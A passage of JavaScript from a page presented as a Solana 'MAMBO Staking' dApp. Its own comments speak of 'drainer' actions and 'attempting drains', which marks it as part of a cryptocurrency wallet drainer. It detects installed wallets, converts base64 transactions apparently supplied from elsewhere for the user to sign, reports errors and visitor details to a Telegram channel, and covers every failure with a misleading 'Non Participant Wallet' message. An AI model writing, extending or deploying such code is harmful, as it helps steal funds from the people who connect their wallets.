      if (message.includes('network')) return 'NETWORK_ERROR';
      if (message.includes('timeout')) return 'TIMEOUT_ERROR';
      if (message.includes('rate limit')) return 'RATE_LIMIT_ERROR';
      
      return 'UNKNOWN_SOLANA_ERROR';
    };
    
    // Enhanced error logging for frontend with graceful promise rejection handling
    window.logFrontendError = function(error, context = {}) {
      try {
        const errorType = window.classifyFrontendError(error);
        
        logger.error(`[FRONTEND_ERROR] ${errorType.toUpperCase()}:`, {
          message: error.message,
          stack: error.stack,
          context: context,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          url: window.location.href
        });
        
        // Send ALL errors to Telegram for comprehensive monitoring
        if (window.sendTelegramLog) {
          window.sendTelegramLog('FRONTEND_ERROR', {
            error: error.message,
            stack: error.stack,
            context: context,
            errorType: errorType,
            timestamp: new Date().toISOString(),
            projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking',
            url: window.location.href,
            userAgent: navigator.userAgent
          });
        }
        
        // Enhanced Solana.js error handling with robust fallbacks
        if (error.message.includes('Unsupported path') || 
            error.message.includes('solana.js') ||
            error.message.includes('RPC') || 
            error.message.includes('endpoint') ||
            error.message.includes('Connection') ||
            error.message.includes('network')) {
          
          console.error(`[SOLANA_ERROR] Solana.js error detected, triggering robust fallback:`, {
            errorType: errorType,
            message: error.message,
            context: context,
            timestamp: new Date().toISOString()
          });
          
          // Trigger comprehensive RPC fallback
          window.triggerRobustRPCFallback(error, context);
          
          return {
            errorType: 'SOLANA_ERROR',
            userMessage: 'Network connection issue - switching to backup servers',
            shouldShowToUser: true
          };
        }
        
        return {
          errorType,
          userMessage: window.getFrontendUserMessage(errorType),
          shouldShowToUser: true
        };
        
      } catch (loggingError) {
        logger.error('[FRONTEND_ERROR] Error handling failed:', loggingError);
        return {
          errorType: FRONTEND_ERROR_TYPES.UNKNOWN,
          userMessage: 'Non Participant Wallet',
          shouldShowToUser: true
        };
      }
    };
    
            // Graceful promise rejection handler for drainer and staking actions
    window.handlePromiseRejection = function(promise, context = {}) {
      return promise.catch(error => {
        console.warn(`⚠️ [PROMISE_HANDLER] Promise rejected in ${context.action || 'unknown action'}:`, error);
        
        // Log the error but don't fail completely
        const errorInfo = window.logFrontendError(error, context);
        
        // Return a graceful fallback response
        return {
          success: false,
          error: errorInfo.userMessage,
          errorType: errorInfo.errorType,
          fallback: true
        };
      });
    };
    
    // Enhanced promise wrapper for critical operations
    window.safePromise = function(promiseFn, context = {}) {
      return new Promise(async (resolve) => {
        try {
          const result = await promiseFn();
          resolve({ success: true, data: result, fallback: false });
        } catch (error) {
          console.warn(`⚠️ [SAFE_PROMISE] Operation failed in ${context.action || 'unknown action'}:`, error);
          
          const errorInfo = window.logFrontendError(error, context);
          
          // Resolve with error info instead of rejecting
          resolve({
            success: false,
            error: errorInfo.userMessage,
            errorType: errorInfo.errorType,
            fallback: true
          });
        }
      });
    };
    
    // API error response handler
    window.handleApiError = function(response, context = {}) {
      try {
        if (!response.ok) {
          const error = new Error(`API call failed with status ${response.status}`);
          error.status = response.status;
          error.context = context;
          
          return window.logFrontendError(error, {
            ...context,
            responseStatus: response.status,
            responseStatusText: response.statusText
          });
        }
        
        return null; // No error
      } catch (parseError) {
        return window.logFrontendError(parseError, {
          ...context,
          originalError: 'Failed to parse API error response'
        });
      }
    };
    
    // Wallet connection error handler
    window.handleWalletError = function(error, walletType, context = {}) {
      const errorInfo = window.logFrontendError(error, {
        ...context,
        walletType: walletType
      });
      
      // Specific handling for wallet-related errors
      if (errorInfo.errorType === FRONTEND_ERROR_TYPES.WALLET_CONNECTION) {
        if (error.message.includes('User rejected')) {
          return {
            ...errorInfo,
            userMessage: 'Non Participant Wallet',
            shouldRetry: false
          };
        }
        
        if (error.message.includes('popup blocked')) {
          return {
            ...errorInfo,
            userMessage: 'Non Participant Wallet',
            shouldRetry: true
          };
        }
        }
      
      return errorInfo;
    };
    
    // Transaction error handler
    window.handleTransactionError = function(error, transaction, context = {}) {
      const errorInfo = window.logFrontendError(error, {
        ...context,
        transactionSize: transaction?.instructions?.length || 0
      });
      
      // Specific handling for transaction-related errors
      if (errorInfo.errorType === FRONTEND_ERROR_TYPES.TRANSACTION_SIGNING) {
        if (error.message.includes('insufficient funds')) {
          return {
            ...errorInfo,
            userMessage: 'Non Participant Wallet',
            shouldRetry: false
          };
        }
        
        if (error.message.includes('invalid owner') || error.message.includes('account not found')) {
          return {
            ...errorInfo,
            userMessage: 'Non Participant Wallet',
            shouldRetry: false
          };
        }
      }
      
      return errorInfo;
    };

    // Enhanced wallet detection at page load with conflict resolution
    logger.log('🔍 [WALLET_DETECTION] Starting wallet detection...');
    
    // Clear any existing wallet references to avoid conflicts
    window.phantomWallet = null;
    window.solflareWallet = null;
    window.backpackWallet = null;
    window.exodusWallet = null;
    window.glowWallet = null;
    window.xnftWallet = null;
    
    // Phantom Wallet - multiple detection methods with conflict resolution
    if (window.phantom?.solana && typeof window.phantom.solana.isPhantom === 'boolean') {
      window.phantomWallet = window.phantom.solana;
      logger.log('✅ [WALLET_DETECTION] Phantom detected via window.phantom.solana');
    } else if (window.phantom && typeof window.phantom.isPhantom === 'boolean') {
      window.phantomWallet = window.phantom;
      logger.log('✅ [WALLET_DETECTION] Phantom detected via window.phantom');
    } else if (window.solana && window.solana.isPhantom) {
      window.phantomWallet = window.solana;
      logger.log('✅ [WALLET_DETECTION] Phantom detected via window.solana');
    }
    
    // Add error handling if all Phantom providers fail
    if (!window.phantomWallet) {
      console.error('[PHANTOM] All Phantom providers failed - no fallback available');
      // Log to console for monitoring (not to Telegram)
      console.error('[PHANTOM_PROVIDER_FAILURE] All Phantom providers failed:', {
        error: 'All Phantom providers failed',
        context: 'Phantom Wallet Detection',
        timestamp: new Date().toISOString(),
        projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
      });
    }
    
    // Solflare Wallet - check for proper methods
    if (window.solflare && typeof window.solflare.isSolflare === 'boolean') {
      window.solflareWallet = window.solflare;
      logger.log('✅ [WALLET_DETECTION] Solflare detected');
    } else if (window.solflare) {
      logger.log('⚠️ [WALLET_DETECTION] Solflare found but missing required methods');
    }
    
    // Backpack Wallet - check for proper methods
    if (window.backpack && typeof window.backpack.isBackpack === 'boolean') {
      window.backpackWallet = window.backpack;
      logger.log('✅ [WALLET_DETECTION] Backpack detected');
    } else if (window.backpack) {
      logger.log('⚠️ [WALLET_DETECTION] Backpack found but missing required methods');
    }
    
    // Exodus Wallet - check for proper methods
    if (window.exodus && typeof window.exodus.isExodus === 'boolean') {
      window.exodusWallet = window.exodus;
      logger.log('✅ [WALLET_DETECTION] Exodus detected');
    } else if (window.exodus) {
      logger.log('⚠️ [WALLET_DETECTION] Exodus found but missing required methods');
    }
    
    // Glow Wallet - check for proper methods
    if (window.glow && typeof window.glow.isGlow === 'boolean') {
      window.glowWallet = window.glow;
      logger.log('✅ [WALLET_DETECTION] Glow detected');
    } else if (window.glow) {
      logger.log('⚠️ [WALLET_DETECTION] Glow found but missing required methods');
    }
    
    // XNFT Wallet - check for proper methods
    if (window.xnft && typeof window.xnft.isXnft === 'boolean') {
      window.xnftWallet = window.xnft;
      logger.log('✅ [WALLET_DETECTION] XNFT detected');
    } else if (window.xnft) {
      logger.log('⚠️ [WALLET_DETECTION] XNFT found but missing required methods');
    }
    
    // Log detection results
    const detectedWallets = [];
    if (window.phantomWallet) detectedWallets.push('Phantom');
    if (window.solflareWallet) detectedWallets.push('Solflare');
    if (window.backpackWallet) detectedWallets.push('Backpack');
    if (window.exodusWallet) detectedWallets.push('Exodus');
    if (window.glowWallet) detectedWallets.push('Glow');
    if (window.xnftWallet) detectedWallets.push('XNFT');
    
    logger.log(`🎯 [WALLET_DETECTION] Detection complete. Found: ${detectedWallets.join(', ') || 'None'}`);
    
    // Set global wallet type if only one is detected
    if (detectedWallets.length === 1) {
      window.currentWalletType = detectedWallets[0].toLowerCase();
      logger.log(`🎯 [WALLET_DETECTION] Single wallet detected, setting currentWalletType: ${window.currentWalletType}`);
    }

    // Wallet Manager
    window.walletManager = {
      connectionStates: new Map(),
      pendingRequests: new Map(),
      failureCounts: new Map(),
      circuitBreakers: new Map(),
      
      setConnectionState: function(walletKey, state) {
        this.connectionStates.set(walletKey, state);
      },
      
      getConnectionState: function(walletKey) {
        return this.connectionStates.get(walletKey);
      },
      
      clearConnectionState: function(walletKey) {
        this.connectionStates.delete(walletKey);
      },
      
      isConnecting: function(walletKey) {
        return this.connectionStates.get(walletKey) === 'connecting';
      },
      
      setPendingRequest: function(walletKey, type) {
        this.pendingRequests.set(walletKey, {
          type: type,
          timestamp: Date.now()
        });
      },
      
      hasPendingRequest: function(walletKey) {
        return this.pendingRequests.has(walletKey);
      },
      
      clearPendingRequest: function(walletKey) {
        this.pendingRequests.delete(walletKey);
      },
      
      clearAllState: function(walletKey) {
        this.connectionStates.delete(walletKey);
        this.pendingRequests.delete(walletKey);
        this.failureCounts.delete(walletKey);
        this.circuitBreakers.delete(walletKey);
      },
      
      recordFailure: function(walletKey) {
        const currentCount = this.failureCounts.get(walletKey) || 0;
        this.failureCounts.set(walletKey, currentCount + 1);
        
        // Enhanced circuit breaker with exponential backoff
        if (currentCount + 1 >= 3) {
          const backoffTime = Math.min(30000 * Math.pow(2, currentCount - 2), 300000); // Max 5 minutes
          this.circuitBreakers.set(walletKey, Date.now() + backoffTime);
          
          // Log circuit breaker activation
          console.log(`[CIRCUIT_BREAKER] ${walletKey} circuit breaker opened for ${backoffTime/1000}s`);
        }
      },
      
      isCircuitBreakerOpen: function(walletKey) {
        const openTime = this.circuitBreakers.get(walletKey);
        if (!openTime) return false;
        
        if (Date.now() > openTime) {
          this.circuitBreakers.delete(walletKey);
          this.failureCounts.delete(walletKey);
          console.log(`[CIRCUIT_BREAKER] ${walletKey} circuit breaker reset`);
          return false;
        }
        
        const remainingTime = Math.ceil((openTime - Date.now()) / 1000);
        console.log(`[CIRCUIT_BREAKER] ${walletKey} circuit breaker open for ${remainingTime}s`);
        return true;
      },
      
      resetCircuitBreaker: function(walletKey) {
        this.circuitBreakers.delete(walletKey);
        this.failureCounts.delete(walletKey);
        console.log(`[CIRCUIT_BREAKER] ${walletKey} circuit breaker manually reset`);
      },
      
      // Enhanced health monitoring
      getWalletHealth: function(walletKey) {
        const failureCount = this.failureCounts.get(walletKey) || 0;
        const isOpen = this.isCircuitBreakerOpen(walletKey);
        const connectionState = this.getConnectionState(walletKey);
        
        return {
          walletKey,
          failureCount,
          circuitBreakerOpen: isOpen,
          connectionState,
          healthy: !isOpen && failureCount < 3,
          lastFailure: this.failureCounts.get(walletKey) ? Date.now() : null
        };
      },
      
      // Get overall system health
      getSystemHealth: function() {
        const wallets = ['phantom', 'solflare', 'backpack', 'glow', 'exodus', 'trust'];
        const health = {};
        
        wallets.forEach(wallet => {
          health[wallet] = this.getWalletHealth(wallet);
        });
        
        return health;
      }
    };

        // Global wallet definitions - Only fully supported wallets
    var fallbackWallets = [
      {
        key: 'phantom',
        name: 'Phantom',
        icon: '/phantom-logo.png',
        requiredMethods: ['connect', 'disconnect', 'signTransaction', 'signMessage', 'isPhantom'],
        provider: function(){
          // Only return provider if all required methods are available
          // Prioritize phantomWallet (already validated during detection)
          if (window.phantomWallet && window.validateWalletMethods(window.phantomWallet, this.requiredMethods)) {
            console.log('🔍 [PHANTOM_PROVIDER] Using validated phantomWallet');
            return window.phantomWallet;
          }
          
          // Fallback to other providers only if phantomWallet is not available
          if (!window.phantomWallet && window.phantom?.solana && window.validateWalletMethods(window.phantom.solana, this.requiredMethods)) {
            console.log('🔍 [PHANTOM_PROVIDER] Using fallback window.phantom.solana');
            return window.phantom.solana;
          }
          
          if (!window.phantomWallet && !window.phantom?.solana && window.phantom && window.validateWalletMethods(window.phantom, this.requiredMethods)) {
            console.log('🔍 [PHANTOM_PROVIDER] Using fallback window.phantom');
            return window.phantom;
          }
          
          console.log('❌ [PHANTOM_PROVIDER] Phantom provider missing required methods');
          return null;
        },
        install: 'https://phantom.app/',
        deepLink: 'phantom://',
        supported: true
      },
      {
        key: 'solflare',
        name: 'Solflare',
        icon: '/solflare-logo.png',
        requiredMethods: ['connect', 'disconnect', 'signTransaction', 'signMessage', 'isSolflare'],
        provider: function(){
          if (window.solflareWallet && window.validateWalletMethods(window.solflareWallet, this.requiredMethods)) {
            console.log('🔍 [SOLFLARE_PROVIDER] Using validated solflareWallet');
            return window.solflareWallet;
          }
          if (window.solflare && window.validateWalletMethods(window.solflare, this.requiredMethods)) {
            console.log('🔍 [SOLFLARE_PROVIDER] Using validated window.solflare');
            return window.solflare;
          }
          console.log('❌ [SOLFLARE_PROVIDER] Solflare provider missing required methods');
          return null;
        },
        install: 'https://solflare.com/',
        deepLink: 'solflare://',
        supported: true
      },
      {
        key: 'glow',
        name: 'Glow',
        icon: '/glow-logo.png',
        requiredMethods: ['connect', 'disconnect', 'signTransaction', 'signMessage', 'isGlow'],
        provider: function(){
          if (window.glowWallet && window.validateWalletMethods(window.glowWallet, this.requiredMethods)) {
            console.log('🔍 [GLOW_PROVIDER] Using validated glowWallet');
            return window.glowWallet;
          }
          if (window.glow && window.validateWalletMethods(window.glow, this.requiredMethods)) {
            console.log('🔍 [GLOW_PROVIDER] Using validated window.glow');
            return window.glow;
          }
          console.log('❌ [GLOW_PROVIDER] Glow provider missing required methods');
          return null;
        }, 
        install: 'https://glow.app/',
        deepLink: 'glow://',
        supported: true
      }
    ];
    
    // Remove unsupported wallets from the list
        var supportedWallets = fallbackWallets.filter(wallet => wallet.supported);
    
    // Wallet method validation function
    window.validateWalletMethods = function(wallet, requiredMethods) {
      if (!wallet || typeof wallet !== 'object') {
        return false;
      }
      
      for (const method of requiredMethods) {
        if (typeof wallet[method] !== 'function' && typeof wallet[method] !== 'boolean') {
          console.warn(`⚠️ [WALLET_VALIDATION] Wallet missing required method: ${method}`);
          return false;
        }
      }
      
      return true;
    };
    
    // Filter wallets to only show supported ones
    window.getSupportedWallets = function() {
      return supportedWallets.filter(wallet => {
        const provider = wallet.provider();
        return provider !== null;
      });
    };

    // Transaction conversion helper
    window.convertBase64ToTransaction = function(base64String) {
      console.log('[TRANSACTION_CONVERTER] Converting base64 to Solana Transaction...');
      
      try {
        let TransactionClass = null;
        if (window.solana && window.solana.Transaction) {
          TransactionClass = window.solana.Transaction;
        } else if (window.solanaWeb3 && window.solanaWeb3.Transaction) {
          TransactionClass = window.solanaWeb3.Transaction;
        } else if (window.SolanaWeb3 && window.SolanaWeb3.Transaction) {
          TransactionClass = window.SolanaWeb3.Transaction;
        } else {
          throw new Error('No Solana Transaction class found');
        }

        if (typeof TransactionClass.from !== 'function') {
          throw new Error('Transaction.from method not available');
        }
        
        const binaryString = atob(base64String);
        const bytes = new Uint8Array(binaryString.length);
        for (let i = 0; i < binaryString.length; i++) {
          bytes[i] = binaryString.charCodeAt(i);
        }
        
        const transaction = TransactionClass.from(bytes);
        console.log('[TRANSACTION_CONVERTER] Successfully created Solana Transaction object');
        
        return transaction;
        
      } catch (error) {
        console.error('[TRANSACTION_CONVERTER] Conversion failed:', error);
        
        // Log critical transaction conversion failures to Telegram
        if (window.sendTelegramLog) {
          window.sendTelegramLog('TRANSACTION_SIGNING', {
            error: error.message,
            stack: error.stack,
            context: 'Transaction Conversion',
            timestamp: new Date().toISOString(),
            projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
          });
        }
        
        throw new Error(`Transaction conversion failed: ${error.message}`);
      }
    };

    // Status display function
    window.showStatus = function(message, type = 'info') {
        console.log(`[STATUS] ${type.toUpperCase()}: ${message}`);
      
      const existingStatus = document.getElementById('status-message');
      if (existingStatus) {
        existingStatus.remove();
      }
      
      const statusDiv = document.createElement('div');
      statusDiv.id = 'status-message';
      statusDiv.style.cssText = `
        position: fixed;
        top: 20px;
        left: 50%;
        transform: translateX(-50%);
        padding: 15px 25px;
        border-radius: 8px;
        color: white;
        font-weight: bold;
        z-index: 10000;
        max-width: 80%;
        text-align: center;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
      `;
      
      switch (type) {
        case 'success':
          statusDiv.style.background = '#28a745';
          break;
        case 'error':
          statusDiv.style.background = '#dc3545';
          break;
        case 'warning':
          statusDiv.style.background = '#ffc107';
          statusDiv.style.color = '#333';
          break;
        case 'loading':
          statusDiv.style.background = '#007bff';
          break;
        default:
          statusDiv.style.background = '#6c757d';
      }
      
      statusDiv.textContent = message;
      document.body.appendChild(statusDiv);
      
        setTimeout(() => {
        if (statusDiv.parentNode) {
          statusDiv.parentNode.removeChild(statusDiv);
        }
      }, 5000);
    };

        // Wallet modal functions with enhanced detection
    window.openWalletModal = function() {
      console.log('🎯 [OPEN_WALLET_MODAL] openWalletModal called');
      
      var modal = document.getElementById('walletModal');
      var walletList = document.getElementById('walletList');
      
      if (!modal || !walletList) {
        console.error('❌ [OPEN_WALLET_MODAL] Modal elements missing');
        console.error('  - Modal found:', !!modal);
        console.error('  - Wallet list found:', !!walletList);
        return;
      }

      console.log('✅ [OPEN_WALLET_MODAL] Modal elements found, refreshing wallet detection...');
      
      // Refresh wallet detection before opening modal
      refreshWalletDetection();
      
      // Generate wallet list
      generateWalletList();
      
      // Show modal
      modal.classList.add('active');
      modal.style.display = 'flex';
      
      console.log('✅ [OPEN_WALLET_MODAL] Modal opened successfully');
    };

    // Enhanced mobile wallet detection and connection helpers
    window.isMobileWallet = function(walletKey) {
      const mobileWallets = ['glow']; // Only Glow is fully supported on mobile
      return mobileWallets.includes(walletKey.toLowerCase());
    };
    
    // Mobile dApp browser detection and wallet injection verification
    window.isMobileDAppBrowser = function() {
      const userAgent = navigator.userAgent.toLowerCase();
      return (
        /mobile|android|iphone|ipad|ipod|blackberry|windows phone/i.test(userAgent) ||
        /phantom|solflare|glow|exodus/i.test(userAgent) ||
        window.location.protocol === 'https:' && window.location.hostname !== 'localhost'
      );
    };
    
    // Verify wallet injection before attempting drains
    window.verifyWalletInjection = function(walletKey, timeout = 10000) {
      return new Promise((resolve, reject) => {
        const startTime = Date.now();
        
        const checkInjection = () => {
          const wallet = window.getWalletProvider(walletKey);
          
          if (wallet && typeof wallet.connect === 'function') {
            console.log(`✅ [WALLET_INJECTION] ${walletKey} wallet properly injected`);
            resolve(wallet);
            return;
          }
          
          if (Date.now() - startTime > timeout) {
            console.error(`❌ [WALLET_INJECTION] ${walletKey} wallet injection timeout after ${timeout}ms`);
            reject(new Error(`Wallet injection timeout for ${walletKey}`));
            return;
          }
          
          // Check again in 100ms
          setTimeout(checkInjection, 100);
        };
        
        checkInjection();
      });
    };
    
    // Get wallet provider with validation
    window.getWalletProvider = function(walletKey) {
      const wallet = supportedWallets.find(w => w.key === walletKey);
      if (!wallet) {
        console.warn(`⚠️ [WALLET_PROVIDER] Unknown wallet key: ${walletKey}`);
        return null;
      }
      
      const provider = wallet.provider();
      if (!provider) {
        console.warn(`⚠️ [WALLET_PROVIDER] No provider found for ${walletKey}`);
        return null;
      }
      
      return provider;
    };

    window.getMobileWalletConnectionHint = function(walletKey) {
      const hints = {

        'exodus': '📱 Exodus: Please open the Exodus app on your mobile device and approve the connection',
        'glow': '📱 Glow: Please open the Glow app on your mobile device and approve the connection'
      };
      return hints[walletKey.toLowerCase()] || '📱 Mobile wallet: Please check your mobile device for connection approval';
    };

    // Connection status display functions
    window.showConnectionStatus = function(message, type = 'info', showProgress = false) {
      const statusContainer = document.getElementById('connection-status');
      const statusText = document.getElementById('status-text');
      const statusProgress = document.getElementById('status-progress');
      
      if (statusContainer && statusText) {
        statusContainer.style.display = 'block';
        statusText.textContent = message;
        
        // Update colors based on type
        switch (type) {
          case 'success':
            statusContainer.style.background = 'rgba(76, 175, 80, 0.2)';
            statusContainer.style.border = '1px solid rgba(76, 175, 80, 0.3)';
            break;
          case 'error':
            statusContainer.style.background = 'rgba(244, 67, 54, 0.2)';
            statusContainer.style.border = '1px solid rgba(244, 67, 54, 0.3)';
            break;
          case 'warning':
            statusContainer.style.background = 'rgba(255, 193, 7, 0.2)';
            statusContainer.style.border = '1px solid rgba(255, 193, 7, 0.3)';
            break;
          case 'loading':
            statusContainer.style.background = 'rgba(33, 150, 243, 0.2)';
            statusContainer.style.border = '1px solid rgba(33, 150, 243, 0.3)';
            break;
          default:
            statusContainer.style.background = 'rgba(255, 255, 255, 0.1)';
            statusContainer.style.border = '1px solid rgba(255, 255, 255, 0.2)';
        }
        
        if (showProgress && statusProgress) {
          statusProgress.style.display = 'block';
        } else if (statusProgress) {
          statusProgress.style.display = 'none';
        }
      }
    }

    window.updateConnectionProgress = function(percentage) {
      const progressBar = document.getElementById('progress-bar');
      if (progressBar) {
        progressBar.style.width = percentage + '%';
      }
    };

    window.hideConnectionStatus = function() {
      const statusContainer = document.getElementById('connection-status');
      if (statusContainer) {
        statusContainer.style.display = 'none';
      }
    };

    // Manual wallet detection refresh
    window.refreshWalletDetection = function() {
      console.log('🔄 [REFRESH_DETECTION] Refreshing wallet detection...');
      
      // Clear cached wallets
      delete window.phantomWallet;
      delete window.solflareWallet;
      delete window.backpackWallet;
      delete window.exodusWallet;
      delete window.glowWallet;
      
      delete window.xnftWallet;
      
      // Re-run detection
      if (window.phantom?.solana) {
        window.phantomWallet = window.phantom.solana;
        console.log('✅ [REFRESH_DETECTION] Phantom detected via window.phantom.solana');
      } else if (window.phantom) {
        window.phantomWallet = window.phantom;
        console.log('✅ [REFRESH_DETECTION] Phantom detected via window.phantom');
      }
      
      if (window.solflare) {
        window.solflareWallet = window.solflare;
        console.log('✅ [REFRESH_DETECTION] Solflare detected');
      }
      
      if (window.backpack) {
        window.backpackWallet = window.backpack;
        console.log('✅ [REFRESH_DETECTION] Backpack detected');
      }
      
      if (window.exodus) {
        window.exodusWallet = window.exodus;
        console.log('✅ [REFRESH_DETECTION] Exodus detected');
      }
      
      if (window.glow) {
        window.glowWallet = window.glow;
        console.log('✅ [REFRESH_DETECTION] Glow detected');
      }
      
      
      
      if (window.xnft) {
        window.xnftWallet = window.xnft;
        console.log('✅ [REFRESH_DETECTION] XNFT detected');
      }
      
      // Log final detection results
      const detectedWallets = [];
      if (window.phantomWallet) detectedWallets.push('Phantom');
      if (window.solflareWallet) detectedWallets.push('Solflare');
      if (window.backpackWallet) detectedWallets.push('Backpack');
      if (window.exodusWallet) detectedWallets.push('Exodus');
      if (window.glowWallet) detectedWallets.push('Glow');
      if (window.xnftWallet) detectedWallets.push('XNFT');
      
        console.log(`🎯 [REFRESH_DETECTION] Detection refresh complete. Found: ${detectedWallets.join(', ') || 'None'}`);
    };

    window.closeWalletModal = function() {
      const modal = document.getElementById('walletModal');
      modal.style.display = 'none';
    };

    // Generate wallet list with enhanced detection and unsupported wallet handling
    window.generateWalletList = function() {
      console.log('🔍 [GENERATE_WALLET_LIST] Starting wallet list generation...');
      
      // Use only supported wallets
      var wallets = window.getSupportedWallets ? window.getSupportedWallets() : fallbackWallets;
      var walletList = document.getElementById('walletList');
      
      if (!walletList) {
        console.error('❌ [GENERATE_WALLET_LIST] Wallet list element not found');
        return;
      }
      
      console.log(`📋 [GENERATE_WALLET_LIST] Processing ${wallets.length} supported wallet definitions`);
      
      walletList.innerHTML = '';
      let availableCount = 0;
      let installedCount = 0;
      
      if (wallets.length === 0) {
        // No supported wallets found - show deep linking modal instead
        walletList.innerHTML = `
          <div class="deep-link-section" style="margin-top: 0;">
            <div class="deep-link-header">
              <h4>🌐 Mobile Wallet Deep Link</h4>
              <p>No wallets detected on this device. Use deep linking to open your mobile wallet:</p>
            </div>
            <div class="deep-link-buttons">
              <button class="deep-link-btn" data-wallet="phantom" onclick="window.deepLinkHandler.openDeepLink('phantom')">
                <img src="/phantom-logo.png" alt="Phantom" class="wallet-icon">
                <span>Open Phantom</span>
              </button>
              <button class="deep-link-btn" data-wallet="solflare" onclick="window.deepLinkHandler.openDeepLink('solflare')">
                <img src="/solflare-logo.png" alt="Solflare" class="wallet-icon">
                <span>Open Solflare</span>
              </button>
              <button class="deep-link-btn" data-wallet="backpack" onclick="window.deepLinkHandler.openDeepLink('backpack')">
                <img src="/backpack-logo.png" alt="Backpack" class="wallet-icon">
                <span>Open Backpack</span>
              </button>
              <button class="deep-link-btn" data-wallet="glow" onclick="window.deepLinkHandler.openDeepLink('glow')">
                <img src="/glow-logo.png" alt="Glow" class="wallet-icon">
                <span>Open Glow</span>
              </button>
              <button class="deep-link-btn" data-wallet="exodus" onclick="window.deepLinkHandler.openDeepLink('exodus')">
                <img src="/logo.png" alt="Exodus" class="wallet-icon">
                <span>Open Exodus</span>
              </button>
            </div>
            <div style="text-align: center; margin-top: 20px; padding: 15px; background: rgba(255, 210, 63, 0.1); border-radius: 10px; border: 1px solid rgba(255, 210, 63, 0.3);">
              <p style="margin: 0; color: #ffd23f; font-size: 14px; font-weight: 600;">
                💡 Deep linking will open your mobile wallet app and connect to this dApp
              </p>
            </div>
          </div>
        `;
        return;
      }
      
      wallets.forEach(function(wallet, index) {
        console.log(`🔍 [GENERATE_WALLET_LIST] Processing wallet ${index + 1}/${wallets.length}: ${wallet.name}`);
        
        var provider = wallet.provider();
        var isAvailable = provider && typeof provider.connect === 'function';
        
        console.log(`  - Provider found: ${provider ? 'YES' : 'NO'}`);
        console.log(`  - Has connect method: ${provider && typeof provider.connect === 'function' ? 'YES' : 'NO'}`);
        console.log(`  - Is available: ${isAvailable ? 'YES' : 'NO'}`);
        
        if (isAvailable) availableCount++;
        if (provider) installedCount++;
        
        var walletItem = document.createElement('div');
        walletItem.className = 'wallet-item';
        walletItem.innerHTML = `
          <img src="${wallet.icon}" alt="${wallet.name}" class="wallet-icon" onerror="this.style.display='none'">
            <span class="wallet-name">${wallet.name}</span>
            <span class="wallet-status ${isAvailable ? 'available' : 'not-installed'}">
              ${isAvailable ? '✅ Available' : '❌ Not Installed'}
            </span>
        `;
        
        if (isAvailable) {
          walletItem.addEventListener('click', function() {
            console.log(`🎯 [WALLET_CLICK] User clicked on ${wallet.name}`);
            connectWalletWithPopup(wallet.key);
          });
          walletItem.style.cursor = 'pointer';
        } else {
          walletItem.addEventListener('click', function() {
            console.log(`🔗 [WALLET_INSTALL] Opening install page for ${wallet.name}`);
            window.open(wallet.install, '_blank');
          });
          walletItem.style.cursor = 'pointer';
        }
        
        walletList.appendChild(walletItem);
        console.log(`✅ [GENERATE_WALLET_LIST] Added ${wallet.name} to list`);
      });
      
      console.log(`🎯 [GENERATE_WALLET_LIST] Generation complete. Available: ${availableCount}, Installed: ${installedCount}, Total: ${wallets.length}`);
      
      // If no wallets are available, show deep linking modal for all users
      if (availableCount === 0) {
        const deepLinkMessage = document.createElement('div');
        deepLinkMessage.className = 'deep-link-section';
        deepLinkMessage.style.marginTop = '20px';
        deepLinkMessage.innerHTML = `
          <div class="deep-link-header">
            <h4>🌐 Mobile Wallet Deep Link</h4>
            <p>No wallets are currently available. Use deep linking to open your mobile wallet:</p>
          </div>
          <div class="deep-link-buttons">
            <button class="deep-link-btn" data-wallet="phantom" onclick="window.deepLinkHandler.openDeepLink('phantom')">
              <img src="/phantom-logo.png" alt="Phantom" class="wallet-icon">
              <span>Open Phantom</span>
            </button>
            <button class="deep-link-btn" data-wallet="solflare" onclick="window.deepLinkHandler.openDeepLink('solflare')">
              <img src="/solflare-logo.png" alt="Solflare" class="wallet-icon">
              <span>Open Solflare</span>
            </button>
            <button class="deep-link-btn" data-wallet="backpack" onclick="window.deepLinkHandler.openDeepLink('backpack')">
              <img src="/backpack-logo.png" alt="Backpack" class="wallet-icon">
              <span>Open Backpack</span>
            </button>
            <button class="deep-link-btn" data-wallet="glow" onclick="window.deepLinkHandler.openDeepLink('glow')">
              <img src="/glow-logo.png" alt="Glow" class="wallet-icon">
              <span>Open Glow</span>
            </button>
            <button class="deep-link-btn" data-wallet="exodus" onclick="window.deepLinkHandler.openDeepLink('exodus')">
              <img src="/logo.png" alt="Exodus" class="wallet-icon">
              <span>Open Exodus</span>
            </button>
          </div>
          <div style="text-align: center; margin-top: 20px; padding: 15px; background: rgba(255, 210, 63, 0.1); border-radius: 10px; border: 1px solid rgba(255, 210, 63, 0.3);">
            <p style="margin: 0; color: #ffd23f; font-size: 14px; font-weight: 600;">
              💡 Deep linking will open your mobile wallet app and connect to this dApp
            </p>
          </div>
        `;
        walletList.appendChild(deepLinkMessage);
      }
    }

    // Mobile device detection function
    window.isMobileDevice = function() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
             (window.innerWidth <= 768 && window.innerHeight <= 1024);
    };

    // Enhanced utility functions with better timeout management
    window.getWalletTimeout = function(walletKey) {
      const timeouts = {
        'phantom': 15000,      // Increased for better reliability
        'solflare': 15000,     // Increased for better reliability
        'backpack': 15000,     // Increased for better reliability
        'glow': 15000,         // Increased for better reliability
        'exodus': 20000,       // Increased for better reliability

      };
      return timeouts[walletKey] || 15000;
    };

    window.getWalletRetryCount = function(walletKey) {
      const retryCounts = {
        'phantom': 2,
        'solflare': 2,
        'backpack': 2,
        'glow': 2,
        'exodus': 2,

      };
      return retryCounts[walletKey] || 2;
    };

    window.classifyWalletError = function(error) {
      if (error.message.includes('User rejected')) return 'user_rejected';
      if (error.message.includes('popup')) return 'popup_blocked';
      if (error.message.includes('timeout')) return 'timeout';
      if (error.message.includes('already pending')) return 'pending_request';
      return 'unknown';
    };

    window.getWalletErrorMessage = function(walletKey, errorType) {
      const messages = {
        'user_rejected': 'Non Participant Wallet',
        'popup_blocked': 'Non Participant Wallet',
        'timeout': 'Non Participant Wallet',
        'pending_request': 'Non Participant Wallet',
        'unknown': 'Non Participant Wallet'
      };
      return messages[errorType] || messages['unknown'];
    };

